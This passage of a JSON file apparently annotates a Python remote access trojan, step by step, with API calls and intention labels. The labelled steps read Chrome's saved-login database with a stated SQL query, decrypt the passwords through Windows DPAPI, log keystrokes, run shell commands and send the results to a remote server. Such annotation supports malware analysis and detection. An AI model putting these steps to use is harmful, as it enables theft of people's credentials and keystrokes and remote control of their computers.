              "action_id": "check_file_is_file",
              "object": "APPDATA + \"/../Local/Google/Chrome/User Data/Default/Login Data\"",
              "object_description": "Chrome local state file",
              "object_id": "chrome_local_state_file",
              "intention_description": "Determine local state file presence",
              "intention_id": "determine_local_state_file_presence"
            },
            {
              "action_api": "sqlite3.connect()",
              "action_description": "Opens SQLite database file",
              "action_id": "open_sqlite_db",
              "object": "strPath",
              "object_description": "Chrome local state file",
              "object_id": "chrome_local_state_file",
              "intention_description": "Open SQLite database",
              "intention_id": "open_sqlite_database"
            },
            {
              "action_api": "conn.cursor()",
              "action_description": "Creates cursor object",
              "action_id": "create_sql_cursor",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Create database cursor",
              "intention_id": "create_database_cursor"
            },
            {
              "action_api": "objCursor.execute()",
              "action_description": "Executes SQL query",
              "action_id": "execute_sql_query",
              "object": "\"Select action_url, username_value, password_value FROM logins\"",
              "object_description": "SQL query string",
              "object_id": "sql_query_string",
              "intention_description": "Query browser passwords",
              "intention_id": "query_browser_passwords"
            },
            {
              "action_api": "win32crypt.CryptUnprotectData()",
              "action_description": "Decrypts Windows DPAPI-encrypted data",
              "action_id": "decrypt_dpapi_data",
              "object": "result[2], None, None, None, 0",
              "object_description": "Encrypted data",
              "object_id": "encrypted_data",
              "intention_description": "Decrypt browser password",
              "intention_id": "decrypt_browser_password"
            },
            {
              "action_api": "str.encode()",
              "action_description": "Encodes string to bytes using default encoding",
              "action_id": "encode_string_to_bytes",
              "object": "strBuffer",
              "object_description": "Encoded string to bytes",
              "object_id": "encoded_string_bytes",
              "intention_description": "Send buffer size to server",
              "intention_id": "send_buffer_size_server"
            },
            {
              "action_api": "send()",
              "action_description": "Sends data over socket connection",
              "action_id": "send_socket_data",
              "object": "str.encode(strResults)",
              "object_description": "Encoded string to bytes",
              "object_id": "encoded_string_bytes",
              "intention_description": "Send password data to server",
              "intention_id": "send_password_data_server"
            },
            {
              "action_api": "KeyListener.start()",
              "action_description": "Starts thread execution",
              "action_id": "start_thread",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Start keylogger in new thread",
              "intention_id": "start_keylogger_thread"
            },
            {
              "action_api": "KeyListener.stop()",
              "action_description": "Waits for thread to finish execution",
              "action_id": "wait_thread",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Wait keylogger thread finish",
              "intention_id": "wait_keylogger_thread_finish"
            },
            {
              "action_api": "threading.Thread.__init__()",
              "action_description": "Creates new thread to execute",
              "action_id": "create_thread",
              "object": "KeyListener",
              "object_description": "Thread target and arguments",
              "object_id": "thread_target_arguments",
              "intention_description": "Re-initialize keylogger thread",
              "intention_id": "reinitialize_keylogger_thread"
            },
            {
              "action_api": "send()",
              "action_description": "Sends data over socket connection",
              "action_id": "send_socket_data",
              "object": "str.encode(str(len(strKeyLogs)))",
              "object_description": "Encoded string to bytes",
              "object_id": "encoded_string_bytes",
              "intention_description": "Send buffer size to server",
              "intention_id": "send_buffer_size_server"
            },
            {
              "action_api": "send()",
              "action_description": "Sends data over socket connection",
              "action_id": "send_socket_data",
              "object": "str.encode(strKeyLogs)",
              "object_description": "Encoded string to bytes",
              "object_id": "encoded_string_bytes",
              "intention_description": "Send keylog data to server",
              "intention_id": "send_keylog_data_server"
            },
            {
              "action_api": "subprocess.Popen()",
              "action_description": "Spawns new process to execute command with shell access",
              "action_id": "spawn_process_shell",
              "object": "command, shell=True",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Execute command",
              "intention_id": "execute_command"
            },
            {
              "action_api": "objCommand.stdout.read()",
              "action_description": "Reads all bytes from process standard output",
              "action_id": "read_process_stdout",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Collect command output",
              "intention_id": "collect_command_output"
            },
            {
              "action_api": "objCommand.stderr.read()",
              "action_description": "Reads all bytes from process standard error",
              "action_id": "read_process_stderr",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Access command error output",
              "intention_id": "access_command_error_output"
            },
            {
              "action_api": "send()",
              "action_description": "Sends data over socket connection",
              "action_id": "send_socket_data",
              "object": "bytData",
              "object_description": "Encoded string to bytes",
              "object_id": "encoded_string_bytes",
              "intention_description": "Send command output to server",
              "intention_id": "send_command_output_server"
            },
            {
              "action_api": "webbrowser.get().open()",
              "action_description": "Opens file with associated application",
              "action_id": "open_file_app",
              "object": "strData[4:]",
              "object_description": "URL string",
              "object_id": "url_string",
              "intention_description": "Open URL in default browser",
              "intention_id": "open_url_browser"
            },
            {
              "action_api": "objSocket.close()",
              "action_description": "Closes the socket connection",
              "action_id": "close_socket",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Disconnect remote server",
              "intention_id": "disconnect_remote_server"
            },
            {
              "action_api": "del objSocket",
              "action_description": "Release connection resource",
              "action_id": "release_connection_resource",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Release connection resource",
              "intention_id": "release_connection_resource"
            }
          ]
        }
      ]
    }
  ]
}